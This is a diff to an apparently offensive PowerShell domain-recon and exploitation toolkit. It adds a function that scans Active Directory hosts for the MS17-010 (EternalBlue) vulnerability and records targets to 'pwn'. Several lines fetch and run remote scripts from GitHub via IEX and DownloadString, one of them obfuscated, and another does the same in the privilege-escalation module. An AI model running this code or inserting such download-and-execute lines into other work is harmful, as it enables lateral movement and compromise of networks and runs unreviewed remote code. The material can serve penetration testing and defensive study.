@@ -670,6 +670,12 @@ function domainreconmodules
 		    }
                     
 	        }
+	    $ms1710 = Read-Host -Prompt 'Search for MS17-10 vulnerable Windows Servers in the domain? (yes/no)'
+            if ($ms1710 -eq "yes" -or $ms1710 -eq "y" -or $ms1710 -eq "Yes" -or $ms1710 -eq "Y")
+            {
+	    	MS17-10	    	
+	    }
+	    
 	    $domainsharepass = Read-Host -Prompt 'Check Domain Network-Shares for cleartext passwords using passhunt.exe? (yes/no)'
             if ($domainsharepass -eq "yes" -or $domainsharepass -eq "y" -or $domainsharepass -eq "Yes" -or $domainsharepass -eq "Y")
             {
@@ -682,6 +688,46 @@ function domainreconmodules
             cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
 }
 
+function MS17-10
+{
+<#
+        .DESCRIPTION
+        Search in AD for pingable Windows servers and Check if they are vulnerable to MS17-10.
+        Author: @securethisshit
+        License: BSD 3-Clause
+    #>
+    #Domain Recon / Lateral Movement / Exploitation Phase
+    IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/ms17-10.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdevobfs.ps1')
+    $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
+    if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
+    {
+	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
+	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
+	foreach ($acserver in $ActiveServers.dnshostname)
+        {
+         	if (Scan-MS17-10 -target $acserver)
+                {
+                	Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. Just Pwn this system!'
+                        echo "$acserver" >> "$currentPath\Exploitation\MS17-10_VulnerableServers.txt"
+                }
+        }
+    }
+    else
+    {
+    	Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
+	$ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
+	foreach ($acserver in $ActiveServers.dnshostname)
+        {
+         	if (Scan-MS17-10 -target $acserver)
+                {
+                	Write-Host -ForegroundColor Yellow 'Found vulnerable System - $acserver. Just Pwn it!'
+                        echo "$acserver" >> "$currentPath\Exploitation\MS17-10_VulnerableSystems.txt"
+                }
+        }
+    }
+
+}
 
 function powerSQL
 {
@@ -801,7 +847,7 @@ function privescmodules
     proportioned >> $currentPath\LocalPrivesc\Sherlock_Vulns.txt
     
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/IkeextCheck.ps1')
-    Invoke-IkeextCheck >> $currentPath\LocalPrivesc\IkeExtVulnerable.txt"
+    Invoke-IkeextCheck >> "$currentPath\LocalPrivesc\IkeExtVulnerable.txt"
     
     $search = Read-Host -Prompt 'Start Just Another Windows (Enum) Script? (yes/no)'
     if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
